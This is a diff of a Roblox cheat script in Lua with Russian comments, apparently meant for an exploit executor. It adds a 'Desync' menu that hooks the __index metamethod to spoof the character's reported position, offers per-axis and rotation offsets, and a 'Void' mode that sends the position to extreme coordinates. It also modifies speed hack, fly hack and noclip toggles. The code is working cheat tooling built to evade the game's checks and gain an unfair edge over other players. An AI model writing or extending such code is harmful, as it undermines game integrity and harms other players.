+                if o.Desync:Active() and Library.Flags["desync_hook"] and self == o.getHrp() then
+                    o.common_vars.oldPosition = o.Desync:GetPositions()
+
+                    if o.common_vars.oldPosition then
+                        return o.common_vars.oldPosition
+                    end
+                end
+            end
+        end
+
+        return o.OldIndex(self, prop)
+    end)
+end
+
+-- Добавляем тогл Enabled для десинка с кейбиндом
+o.DesyncToggle = PlayerDesyncSection:Toggle({
+    name = "Enabled",
+    default = false,
+    flag = "desync",
+    callback = function(value)
+        if not value then
+            o.Desync:SetStatus(nil)
+            o.Desync:RemoveOverwrite()
+            
+            -- Проверяем, нужно ли скрыть клон
+            if o.Desync.ClonedCharacter and Library.Flags["desync_vis"] then
+                -- Если Visualize включен, но Enabled выключен, удаляем клон
+                o.Desync:DestroyClonedCharacter()
+            end
+        else
+            -- Если включили Enabled и Visualize тоже включен, создаем клон
+            if Library.Flags["desync_vis"] and not o.Desync.ClonedCharacter then
+                o.Desync:CloneCharacter()
+            end
+        end
+    end
+})
+
+-- Добавляем кейбинд для активации десинка
+o.DesyncToggle:Keybind({
+    flag = "desync_key",
+    callback = function(key)
+        -- Проверяем состояние кейбинда и тогла визуализации
+        o.common_vars.isDesyncActive = Library.Flags["desync"] and Library.Flags["desync_key"]
+        o.common_vars.shouldShowClone = o.common_vars.isDesyncActive and Library.Flags["desync_vis"]
+        
+        -- Управляем видимостью клона в зависимости от состояния десинка
+        if o.common_vars.shouldShowClone and not o.Desync.ClonedCharacter then
+            o.Desync:CloneCharacter()
+        elseif not o.common_vars.shouldShowClone and o.Desync.ClonedCharacter then
+            o.Desync:DestroyClonedCharacter()
+        end
+    end
+})
+
+-- Добавляем тогл Use Hook для десинка
+PlayerDesyncSection:Toggle({
+    name = "Use Hook",
+    default = false,
+    flag = "desync_hook"
+})
+
+-- Добавляем тогл X Position с попапом
+o.XPositionToggle = PlayerDesyncSection:Toggle({
+    name = "X Position",
+    default = false,
+    flag = "desync_x"
+})
+
+-- Создаем один попап для X Position
+o.XPositionPopup = o.XPositionToggle:Popup({size = 150})
+
+-- Добавляем выпадающий список для режима X Position
+o.XPositionPopup:Dropdown({
+    name = "Mode",
+    values = {"Static", "Lerp", "Random"},
+    value = "Static",
+    flag = "desync_mode_x"
+})
+
+-- Добавляем текстбокс для значения X Position
+o.XPositionPopup:Textbox({
+    name = "Static Value",
+    description = "Position offset in studs",
+    placeholder = "0",
+    default = "0",
+    flag = "desync_val_x_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_val_x"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбоксы для мин/макс значений X Position
+o.XPositionPopup:Textbox({
+    name = "Minimum",
+    description = "Minimum position offset",
+    placeholder = "-5",
+    default = "-5",
+    flag = "desync_min_x_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_min_x"] = o.common_vars.value
+        end
+    end
+})
+
+o.XPositionPopup:Textbox({
+    name = "Maximum",
+    description = "Maximum position offset",
+    placeholder = "5",
+    default = "5",
+    flag = "desync_max_x_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_max_x"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбокс для скорости Lerp X Position
+o.XPositionPopup:Textbox({
+    name = "Lerp Speed",
+    description = "Animation speed for Lerp mode",
+    placeholder = "1",
+    default = "1",
+    flag = "desync_speed_x_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_speed_x"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем тогл Y Position с попапом
+o.YPositionToggle = PlayerDesyncSection:Toggle({
+    name = "Y Position",
+    default = false,
+    flag = "desync_y"
+})
+
+-- Создаем один попап для Y Position
+o.YPositionPopup = o.YPositionToggle:Popup({size = 150})
+
+-- Добавляем выпадающий список для режима Y Position
+o.YPositionPopup:Dropdown({
+    name = "Mode",
+    values = {"Static", "Lerp", "Random"},
+    value = "Static",
+    flag = "desync_mode_y"
+})
+
+-- Добавляем текстбокс для значения Y Position
+o.YPositionPopup:Textbox({
+    name = "Static Value",
+    description = "Vertical offset in studs",
+    placeholder = "0",
+    default = "0",
+    flag = "desync_val_y_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_val_y"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбоксы для мин/макс значений Y Position
+o.YPositionPopup:Textbox({
+    name = "Minimum",
+    description = "Minimum vertical offset",
+    placeholder = "-5",
+    default = "-5",
+    flag = "desync_min_y_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_min_y"] = o.common_vars.value
+        end
+    end
+})
+
+o.YPositionPopup:Textbox({
+    name = "Maximum",
+    description = "Maximum vertical offset",
+    placeholder = "5",
+    default = "5",
+    flag = "desync_max_y_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_max_y"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбокс для скорости Lerp Y Position
+o.YPositionPopup:Textbox({
+    name = "Lerp Speed",
+    description = "Animation speed for Lerp mode",
+    placeholder = "1",
+    default = "1",
+    flag = "desync_speed_y_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_speed_y"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем тогл Z Position с попапом
+o.ZPositionToggle = PlayerDesyncSection:Toggle({
+    name = "Z Position",
+    default = false,
+    flag = "desync_z"
+})
+
+-- Создаем один попап для Z Position
+o.ZPositionPopup = o.ZPositionToggle:Popup({size = 150})
+
+-- Добавляем выпадающий список для режима Z Position
+o.ZPositionPopup:Dropdown({
+    name = "Mode",
+    values = {"Static", "Lerp", "Random"},
+    value = "Static",
+    flag = "desync_mode_z"
+})
+
+-- Добавляем текстбокс для значения Z Position
+o.ZPositionPopup:Textbox({
+    name = "Static Value",
+    description = "Forward/back offset in studs",
+    placeholder = "0",
+    default = "0",
+    flag = "desync_val_z_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_val_z"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбоксы для мин/макс значений Z Position
+o.ZPositionPopup:Textbox({
+    name = "Minimum",
+    description = "Minimum forward/back offset",
+    placeholder = "-5",
+    default = "-5",
+    flag = "desync_min_z_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_min_z"] = o.common_vars.value
+        end
+    end
+})
+
+o.ZPositionPopup:Textbox({
+    name = "Maximum",
+    description = "Maximum forward/back offset",
+    placeholder = "5",
+    default = "5",
+    flag = "desync_max_z_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_max_z"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбокс для скорости Lerp Z Position
+o.ZPositionPopup:Textbox({
+    name = "Lerp Speed",
+    description = "Animation speed for Lerp mode",
+    placeholder = "1",
+    default = "1",
+    flag = "desync_speed_z_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_speed_z"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем тогл Pitch Position с попапом
+o.PitchPositionToggle = PlayerDesyncSection:Toggle({
+    name = "Pitch Position",
+    default = false,
+    flag = "desync_pitch"
+})
+
+-- Создаем один попап для Pitch Position
+o.PitchPositionPopup = o.PitchPositionToggle:Popup({size = 150})
+
+-- Добавляем выпадающий список для режима Pitch Position
+o.PitchPositionPopup:Dropdown({
+    name = "Mode",
+    values = {"Static", "Lerp", "Random"},
+    value = "Static",
+    flag = "desync_mode_pitch"
+})
+
+-- Добавляем текстбокс для значения Pitch Position
+o.PitchPositionPopup:Textbox({
+    name = "Static Value",
+    description = "Up/down rotation in degrees",
+    placeholder = "0",
+    default = "0",
+    flag = "desync_val_pitch_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_val_pitch"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбоксы для мин/макс значений Pitch Position
+o.PitchPositionPopup:Textbox({
+    name = "Minimum",
+    description = "Minimum pitch angle",
+    placeholder = "-90",
+    default = "-90",
+    flag = "desync_min_pitch_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_min_pitch"] = o.common_vars.value
+        end
+    end
+})
+
+o.PitchPositionPopup:Textbox({
+    name = "Maximum",
+    description = "Maximum pitch angle",
+    placeholder = "90",
+    default = "90",
+    flag = "desync_max_pitch_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_max_pitch"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбокс для скорости Lerp Pitch Position
+o.PitchPositionPopup:Textbox({
+    name = "Lerp Speed",
+    description = "Animation speed for Lerp mode",
+    placeholder = "1",
+    default = "1",
+    flag = "desync_speed_pitch_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_speed_pitch"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем тогл Yaw Position с попапом
+o.YawPositionToggle = PlayerDesyncSection:Toggle({
+    name = "Yaw Position",
+    default = false,
+    flag = "desync_yaw"
+})
+
+-- Создаем один попап для Yaw Position
+o.YawPositionPopup = o.YawPositionToggle:Popup({size = 150})
+
+-- Добавляем выпадающий список для режима Yaw Position
+o.YawPositionPopup:Dropdown({
+    name = "Mode",
+    values = {"Static", "Lerp", "Random"},
+    value = "Static",
+    flag = "desync_mode_yaw"
+})
+
+-- Добавляем текстбокс для значения Yaw Position
+o.YawPositionPopup:Textbox({
+    name = "Static Value",
+    description = "Left/right rotation in degrees",
+    placeholder = "0",
+    default = "0",
+    flag = "desync_val_yaw_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_val_yaw"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбоксы для мин/макс значений Yaw Position
+o.YawPositionPopup:Textbox({
+    name = "Minimum",
+    description = "Minimum yaw angle",
+    placeholder = "-90",
+    default = "-90",
+    flag = "desync_min_yaw_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_min_yaw"] = o.common_vars.value
+        end
+    end
+})
+
+o.YawPositionPopup:Textbox({
+    name = "Maximum",
+    description = "Maximum yaw angle",
+    placeholder = "90",
+    default = "90",
+    flag = "desync_max_yaw_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_max_yaw"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбокс для скорости Lerp Yaw Position
+o.YawPositionPopup:Textbox({
+    name = "Lerp Speed",
+    description = "Animation speed for Lerp mode",
+    placeholder = "1",
+    default = "1",
+    flag = "desync_speed_yaw_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_speed_yaw"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем тогл Roll Position с попапом
+o.RollPositionToggle = PlayerDesyncSection:Toggle({
+    name = "Roll Position",
+    default = false,
+    flag = "desync_roll"
+})
+
+-- Создаем один попап для Roll Position
+o.RollPositionPopup = o.RollPositionToggle:Popup({size = 150})
+
+-- Добавляем выпадающий список для режима Roll Position
+o.RollPositionPopup:Dropdown({
+    name = "Mode",
+    values = {"Static", "Lerp", "Random"},
+    value = "Static",
+    flag = "desync_mode_roll"
+})
+
+-- Добавляем текстбокс для значения Roll Position
+o.RollPositionPopup:Textbox({
+    name = "Static Value",
+    description = "Tilt rotation in degrees",
+    placeholder = "0",
+    default = "0",
+    flag = "desync_val_roll_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_val_roll"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбоксы для мин/макс значений Roll Position
+o.RollPositionPopup:Textbox({
+    name = "Minimum",
+    description = "Minimum roll angle",
+    placeholder = "-90",
+    default = "-90",
+    flag = "desync_min_roll_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_min_roll"] = o.common_vars.value
+        end
+    end
+})
+
+o.RollPositionPopup:Textbox({
+    name = "Maximum",
+    description = "Maximum roll angle",
+    placeholder = "90",
+    default = "90",
+    flag = "desync_max_roll_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_max_roll"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем текстбокс для скорости Lerp Roll Position
+o.RollPositionPopup:Textbox({
+    name = "Lerp Speed",
+    description = "Animation speed for Lerp mode",
+    placeholder = "1",
+    default = "1",
+    flag = "desync_speed_roll_text",
+    callback = function(text)
+        o.common_vars.value = tonumber(text)
+        if o.common_vars.value then
+            Library.Flags["desync_speed_roll"] = o.common_vars.value
+        end
+    end
+})
+
+-- Добавляем тогл Void с кейбиндом
+o.VoidToggle = PlayerDesyncSection:Toggle({
+    name = "Void",
+    default = false,
+    flag = "desync_void",
+    callback = function(value)
+        if value and Library.Flags["desync_void_key"] then
+            o.Desync:SetStatus(true)
+            o.Desync:OverwritePosition(o.funcs.v3(9e9, -9e9, 9e9))
+            
+            -- Обновляем клон, если включена визуализация
+            if Library.Flags["desync_vis"] and not o.Desync.ClonedCharacter then
+                o.Desync:CloneCharacter()
+            end
+        else
+            o.Desync:SetStatus(nil)
+            o.Desync:RemoveOverwrite()
+            
+            -- Проверяем, нужно ли скрыть клон
+            o.common_vars.isDesyncActive = Library.Flags["desync"] and Library.Flags["desync_key"]
+            if not o.common_vars.isDesyncActive and o.Desync.ClonedCharacter then
+                o.Desync:DestroyClonedCharacter()
+            end
+        end
+    end
+})
+
+-- Добавляем кейбинд для Void
+o.VoidToggle:Keybind({
+    flag = "desync_void_key",
+    callback = function(key)
+        if key and Library.Flags["desync_void"] then
+            o.Desync:SetStatus(true)
+            o.Desync:OverwritePosition(o.funcs.v3(9e9, -9e9, 9e9))
+        else
+            o.Desync:SetStatus(nil)
+            o.Desync:RemoveOverwrite()
+        end
+    end
+})
+
+-- Добавляем тогл Visualize с колорпикером
+o.VisualizeToggle = PlayerDesyncSection:Toggle({
+    name = "Visualize",
+    default = false,
+    flag = "desync_vis",
+    callback = function(value)
+        -- Проверяем, должен ли быть виден клон (оба тогла должны быть включены)
+        o.common_vars.shouldShowClone = value and Library.Flags["desync"]
+        
+        if o.common_vars.shouldShowClone then
+            -- Принудительно создаем клон при включении обоих тоглов
+            if not o.Desync.ClonedCharacter then
+                o.Desync:CloneCharacter()
+            end
+        else
+            -- Принудительно удаляем клон при выключении любого из тоглов
+            if o.Desync.ClonedCharacter then
+                o.Desync:DestroyClonedCharacter()
+            end
+        end
+    end
+})
+
+-- Создаем один попап для Visualize
+o.VisualizePopup = o.VisualizeToggle:Popup({size = 150})
+
+-- Добавляем колорпикер для цвета визуализации
+o.VisualizePopup:Colorpicker({
+    name = "Color",
+    default = o.funcs.rgb(255, 0, 0),
+    flag = "desync_vis_color",
+    callback = function(color)
+        -- Обновляем внешний вид клона при изменении цвета
+        if o.Desync.ClonedCharacter then
+            o.Desync:UpdateCharacter()
+        end
+    end
+})
+
+-- Добавляем выпадающий список для материала визуализации
+o.VisualizePopup:Dropdown({
+    name = "Material",
+    values = {"ForceField", "Neon", "SmoothPlastic", "Glass"},
+    value = "ForceField",
+    flag = "desync_vis_material",
+    callback = function(material)
+        -- Обновляем внешний вид клона при изменении материала
+        if o.Desync.ClonedCharacter then
+            o.Desync:UpdateCharacter()
+        end
+    end
+})
 
 -- Конфигурация SpeedHack
 o.SpeedhackConfig = {
@@ -58,7 +1541,7 @@ o.FlyConfig = {
 }
 
 -- Функция для включения/выключения коллизий у персонажа
-local function setNoClip(character, state)
+function setNoClip(character, state)
     if not character then return end
     
     for _, part in ipairs(character:GetDescendants()) do
@@ -95,7 +1578,7 @@ local function setNoClip(character, state)
 end
 
 -- Основная функция полета
-local function updateFly(character)
+function updateFly(character)
     if o.FlyLoop then
         o.FlyLoop:Disconnect()
         o.FlyLoop = nil
@@ -171,7 +1654,7 @@ local function updateFly(character)
 end
 
 -- Останавливает полет
-local function stopFly()
+function stopFly()
     if o.FlyLoop then
         o.FlyLoop:Disconnect()
         o.FlyLoop = nil
@@ -204,7 +1687,7 @@ local function stopFly()
 end
 
 -- Функция обновления SpeedHack
-local function updateSpeedHack(character)
+function updateSpeedHack(character)
     if not character then return end
     
     -- Используем функции из таблицы оптимизации для получения частей персонажа
@@ -230,8 +1713,8 @@ local function updateSpeedHack(character)
 end
 
 -- Добавляем тогл SpeedHack с попапом
-local SpeedHackToggle = PlayerMovementSection:Toggle({
-    name = "Speedhack",
+o.SpeedHackToggle = PlayerMovementSection:Toggle({
+    name = "Speed Hack",
     default = false,
     flag = "player_speedhack",
     callback = function(value)
@@ -256,11 +1739,11 @@ local SpeedHackToggle = PlayerMovementSection:Toggle({
     end
 })
 
--- Создаем попап для настроек SpeedHack
-local SpeedHackPopup = SpeedHackToggle:Popup({size = 150})
+-- Создаем один попап для настроек SpeedHack
+o.SpeedHackPopup = o.SpeedHackToggle:Popup({size = 150})
 
 -- Добавляем кейбинд в попап для SpeedHack
-SpeedHackPopup:Keybind({
+o.SpeedHackPopup:Keybind({
     name = "Activation Key",
     flag = "speedhack_key",
     callback = function()
@@ -276,7 +1759,7 @@ SpeedHackPopup:Keybind({
 })
 
 -- Добавляем текстбокс для настройки скорости в попап
-SpeedHackPopup:Textbox({
+o.SpeedHackPopup:Textbox({
     name = "Speed",
     placeholder = "50",
     default = "50",
@@ -293,8 +1776,8 @@ SpeedHackPopup:Textbox({
 })
 
 -- Добавляем тогл Fly с попапом
-local FlyToggle = PlayerMovementSection:Toggle({
-    name = "Fly",
+o.FlyToggle = PlayerMovementSection:Toggle({
+    name = "Fly Hack",
     default = false,
     flag = "player_fly",
     callback = function(value)
@@ -313,11 +1796,11 @@ local FlyToggle = PlayerMovementSection:Toggle({
     end
 })
 
--- Создаем попап для настроек Fly
-local FlyPopup = FlyToggle:Popup({size = 150})
+-- Создаем один попап для настроек Fly
+o.FlyPopup = o.FlyToggle:Popup({size = 150})
 
 -- Добавляем кейбинд для активации в попап для Fly
-FlyPopup:Keybind({
+o.FlyPopup:Keybind({
     name = "Activation Key",
     flag = "fly_key",
     callback = function()
@@ -340,7 +1823,7 @@ FlyPopup:Keybind({
 })
 
 -- Добавляем тогл UseCamera в попап
-FlyPopup:Toggle({
+o.FlyPopup:Toggle({
     name = "UseCamera",
     default = false,
     flag = "fly_usecamera",
@@ -350,7 +1833,7 @@ FlyPopup:Toggle({
 })
 
 -- Добавляем кейбинд для движения вверх
-FlyPopup:Keybind({
+o.FlyPopup:Keybind({
     name = "Up Key",
     flag = "fly_up_key",
     callback = function(key)
@@ -360,7 +1843,7 @@ FlyPopup:Keybind({
 })
 
 -- Добавляем кейбинд для движения вниз
-FlyPopup:Keybind({
+o.FlyPopup:Keybind({
     name = "Down Key",
     flag = "fly_down_key",
     callback = function(key)
@@ -370,7 +1853,7 @@ FlyPopup:Keybind({
 })
 
 -- Добавляем текстбокс для настройки множителя скорости
-FlyPopup:Textbox({
+o.FlyPopup:Textbox({
     name = "Speed",
     placeholder = "5",
     default = "5",
@@ -398,263 +1881,21 @@ o.lp.CharacterAdded:Connect(function(char)
     end
 end)
 
--- Добавляем тогл Anti AFK
-PlayerMainSection:Toggle({
-    name = "Anti AFK",
-    default = false,
-    flag = "player_antiafk",
-    callback = function(value)
-        if value then
-            -- Создаем и запускаем Anti AFK скрипт
-            o.antiAFKConnection = o.lp.Idled:Connect(function()
-                o.VirtualUser = game:GetService("VirtualUser")
-                o.VirtualUser:CaptureController()
-                o.VirtualUser:ClickButton2(Vector2.new())
-            end)
-            
-            -- Сохраняем соединение в Library.Flags для возможности отключения
-            Library.Flags["antiafk_connection"] = o.antiAFKConnection
-        else
-            -- Отключаем Anti AFK если тогл выключен
-            if o.antiAFKConnection then
-                o.antiAFKConnection:Disconnect()
-                o.antiAFKConnection = nil
-                Library.Flags["antiafk_connection"] = nil
-            end
-        end
-    end
-})
-
--- Добавляем тогл FakeMacro (только с LeftControl)
-PlayerMainSection:Toggle({
-    name = "Fake Macro",
-    default = false,
-    flag = "player_fakemacro",
-    callback = function(value)
-        -- Включаем/выключаем FakeMacro
-        Library.Flags["fakemacro_enabled"] = value
-        
-        -- Показываем уведомление при включении
-        if value then
-            Library.Notification({Name = "Fake Macro", Description = "Hold LeftControl to macro"})
-        end
-        
-        -- Управляем соединениями
-        if value then
-            -- Создаем соединения, если их еще нет
-            if not Library.Flags["fakemacro_connections"] then
-                -- Глобальная переменная для отслеживания состояния
-                o.toggleEnabled = false
-                
-                -- Соединение для отслеживания нажатия клавиши LeftControl
-                o.fakeMacroInputBegan = o.uis.InputBegan:Connect(function(input, gameProcessed)
-                    if input.KeyCode == Enum.KeyCode.LeftControl and not gameProcessed then
-                        o.toggleEnabled = true
-                    end
-                end)
-                
-                -- Соединение для отслеживания отпускания клавиши LeftControl
-                o.fakeMacroInputEnded = o.uis.InputEnded:Connect(function(input, gameProcessed)
-                    if input.KeyCode == Enum.KeyCode.LeftControl and not gameProcessed then
-                        o.toggleEnabled = false
-                    end
-                end)
-                
-                -- Соединение для обновления ориентации персонажа
-                o.fakeMacroHeartbeat = o.rs.Heartbeat:Connect(function()
-                    if o.toggleEnabled then
-                        if o.lp.Character then
-                            if o.lp.Character:FindFirstChild("HumanoidRootPart") then
-                                if o.camera then
-                                    o.lp.Character.HumanoidRootPart.CFrame = CFrame.new(o.lp.Character.HumanoidRootPart.Position) * 
-                                        CFrame.Angles(0, math.atan2(-o.camera.CFrame.LookVector.X, -o.camera.CFrame.LookVector.Z), 0)
-                                end
-                            end
-                        end
-                    end
-                end)
-                
-                -- Сохраняем соединения для возможности отключения
-                Library.Flags["fakemacro_connections"] = {
-                    inputBegan = o.fakeMacroInputBegan,
-                    inputEnded = o.fakeMacroInputEnded,
-                    heartbeat = o.fakeMacroHeartbeat
-                }
-            end
-        else
-            -- Отключаем соединения, если тогл выключен
-            if Library.Flags["fakemacro_connections"] then
-                if o.fakeMacroInputBegan then o.fakeMacroInputBegan:Disconnect() end
-                if o.fakeMacroInputEnded then o.fakeMacroInputEnded:Disconnect() end
-                if o.fakeMacroHeartbeat then o.fakeMacroHeartbeat:Disconnect() end
-                Library.Flags["fakemacro_connections"] = nil
-            end
-        end
-    end
-})
-
--- Функция для изменения настроек отображения имен
-function SetNameDisplay(enabled, mode)
-    o.NameDisplayEnabled = enabled
-    o.NameDisplayMode = mode or "display"
-    
-    -- Сохраняем режим в флагах для использования в других местах
-    Library.Flags["name_display_actual_mode"] = o.NameDisplayMode
-    
-    -- Обновить все имена
-    for _, player in ipairs(o.plrs:GetPlayers()) do
-        if player.Character then
-            o.humanoid = player.Character:FindFirstChild("Humanoid")
-            if o.humanoid then
-                -- Всегда сбрасываем параметры отображения к стандартным при выключении тогла
-                if not o.NameDisplayEnabled then
-                    -- Возвращаем исходное отображение имени
-                    o.humanoid.DisplayName = player.DisplayName
-                    o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
-                    
-                    -- Если были удалены BillboardGui на голове, восстановим систему имен
-                    o.head = player.Character:FindFirstChild("Head")
-                    if o.head then
-                        -- Если никаких билбордов нет, это может означать, что они были удалены
-                        o.common_vars.hasBillboard = false
-                        for _, child in ipairs(o.head:GetChildren()) do
-                            if child:IsA("BillboardGui") then
-                                o.common_vars.hasBillboard = true
-                                break
-                            end
-                        end
-                        
-                        -- Принудительно обновляем персонажа для восстановления имен если нужно
-                        if not o.common_vars.hasBillboard then
-                            -- Обновляем настройки гуманоида для восстановления отображения имени
-                            task.delay(0.1, function()
-                                if o.humanoid then
-                                    o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Subject
-                                    task.delay(0.1, function()
-                                        if o.humanoid then
-                                            o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
-                                        end
-                                    end)
-                                end
-                            end)
-                        end
-                    end
-                else
-                    if o.NameDisplayMode == "display" then
-                        o.humanoid.DisplayName = player.DisplayName
-                        o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
-                    elseif o.NameDisplayMode == "original" then
-                        o.humanoid.DisplayName = player.Name
-                        o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
-                    elseif o.NameDisplayMode == "none" then
-                        -- Полностью скрываем имя, устанавливая пустую строку И делая его прозрачным
-                        o.humanoid.DisplayName = ""
-                        o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
-                        -- Для дополнительной надежности также пробуем другие методы скрытия имени
-                        o.head = player.Character:FindFirstChild("Head")
-                        if o.head then
-                            -- Удаляем существующие текстовые метки над головой
-                            for _, child in ipairs(o.head:GetChildren()) do
-                                if child:IsA("BillboardGui") then
-                                    child:Destroy()
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-    
-    -- Настраиваем обработчики для новых игроков и персонажей
-    if not Library.Flags["name_display_connection"] then
-        o.nameDisplayConnection = o.plrs.PlayerAdded:Connect(function(player)
-            player.CharacterAdded:Connect(function(character)
-                o.humanoid = character:FindFirstChild("Humanoid")
-                if o.humanoid then
-                    if Library.Flags["player_alwaysshow"] then
-                        o.common_vars.mode = Library.Flags["name_display_actual_mode"]
-                        if o.common_vars.mode == "display" then
-                            o.humanoid.DisplayName = player.DisplayName
-                            o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
-                        elseif o.common_vars.mode == "original" then
-                            o.humanoid.DisplayName = player.Name
-                            o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
-                        elseif o.common_vars.mode == "none" then
-                            o.humanoid.DisplayName = ""
-                            o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
-                            
-                            -- Дополнительные методы для полного скрытия имени
-                            task.delay(0.5, function() -- Небольшая задержка для гарантии загрузки головы
-                                if player.Character and player.Character:FindFirstChild("Head") then
-                                    for _, child in ipairs(player.Character.Head:GetChildren()) do
-                                        if child:IsA("BillboardGui") then
-                                            child:Destroy()
-                                        end
-                                    end
-                                end
-                            end)
-                        end
-                    else
-                        -- Если тогл выключен, восстанавливаем имя
-                        o.humanoid.DisplayName = player.DisplayName
-                        o.humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
-                    end
-                end
-            end)
-        end)
-        
-        -- Сохраняем соединение для возможности отключения
-        Library.Flags["name_display_connection"] = o.nameDisplayConnection
-    end
-end
-
--- Добавляем тогл AlwaysShow с попапом для настройки отображения имен
-PlayerMainSection:Toggle({
-    name = "AlwaysShow",
-    default = false,
-    flag = "player_alwaysshow",
-    callback = function(value)
-        -- Включаем/выключаем систему отображения имен
-        SetNameDisplay(value, Library.Flags["name_display_actual_mode"])
-    end
-}):Popup({size = 150}):Dropdown({
-    name = "Display Mode",
-    values = {"Display Name", "Original Name", "No Name"},
-    value = "Display Name",
-    flag = "name_display_mode",
-    callback = function(option)
-        -- Определяем режим отображения на основе выбранного значения
-        if option == "Display Name" then
-            o.common_vars.mode = "display"
-        elseif option == "Original Name" then
-            o.common_vars.mode = "original"
-        elseif option == "No Name" then
-            o.common_vars.mode = "none"
-        end
-        
-        -- Обновляем режим отображения имен, если система включена
-        if Library.Flags["player_alwaysshow"] then
-            SetNameDisplay(true, o.common_vars.mode)
-        end
-    end
-})
-
 -- Конфигурации
-ConfigSection = ConfigTab:Section({name = "Configurations", description = ">_<"})
-ConfigFolder = "BrandNew/Games/Universal/Configs"
+o.ConfigSection = ConfigTab:Section({name = "Configurations", description = ">_<"})
+o.ConfigFolder = "BrandNew/Games/Universal/Configs"
 
 -- Создание папки, если она не существует
-if not isfolder(ConfigFolder) then
-    makefolder(ConfigFolder)
+if not isfolder(o.ConfigFolder) then
+    makefolder(o.ConfigFolder)
 end
 
 -- Функция получения файлов конфигурации
 function GetConfigFiles()
     o.common_vars.files = {}
     
-    if isfolder(ConfigFolder) then
-        for _, file in ipairs(listfiles(ConfigFolder)) do
+    if isfolder(o.ConfigFolder) then
+        for _, file in ipairs(listfiles(o.ConfigFolder)) do
             if file:sub(-4) == ".cfg" then
                 o.common_vars.configName = file:match("([^/\\]+)%.cfg$")
                 table.insert(o.common_vars.files, o.common_vars.configName)
@@ -666,10 +1907,10 @@ function GetConfigFiles()
 end
 
 -- Поле ввода имени конфига
-ConfigName = ConfigSection:Textbox({name = "ConfigName", placeholder = "", flag = "config_name"})
+o.ConfigName = o.ConfigSection:Textbox({name = "ConfigName", placeholder = "", flag = "config_name"})
 
 -- Список конфигов
-ConfigList = ConfigSection:List({
+o.ConfigList = o.ConfigSection:List({
     name = "Config",
     values = GetConfigFiles(),
     value = GetConfigFiles()[1] or "",
@@ -679,69 +1920,61 @@ ConfigList = ConfigSection:List({
 })
 
 -- Кнопка сохранения
-ConfigSection:Button({
+o.ConfigSection:Button({
     name = "SaveConfig", description = ">_<",
     callback = function()
         o.common_vars.configName = Library.Flags["config_name"]
